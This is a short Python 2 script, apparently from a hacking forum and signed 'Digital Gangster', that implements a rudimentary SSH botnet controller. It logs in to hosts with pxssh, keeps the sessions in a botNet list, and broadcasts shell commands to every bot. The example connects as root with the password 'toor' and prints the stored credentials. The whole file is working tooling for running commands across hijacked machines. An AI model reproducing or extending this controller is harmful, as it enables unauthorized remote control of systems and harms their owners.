from pexpect import pxssh
 
class Client:
 
    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.connect()
 
    def connect(self):
        try:
                s = pxssh.pxssh()
                s.login(self.host, self.user, self.password)
                return s
        except Exception, e:
                print e
                print '[-] Error Connecting'
    def display(self):
        print '[*] IP Address: '+self.host
        print '[*] Username: '+ self.user
        print '[*] Password: '+ self.password

    def send_command(self, cmd):
            self.session.sendline(cmd)
            self.session.prompt()
            return self.session.before

def displayClients():
    for client in botNet:
        client.display()
	print ''
 
def botnetCommand(command):
    for client in botNet:
        output = client.send_command(command)
        print '[*] Output from ' + client.host
        print '[*] ' + output
 
def addClient(host, user, password):
    client = Client(host, user, password)
    botNet.append(client)

botNet = []
 
# Example
# Add/connect a client to the botNet list
addClient('100.64.1.1', 'root', 'toor')
# Send a command to all bots
botnetCommand('ls -la')

#display  all clients
displayClients()
# Digital Gangster [2015-02-26]
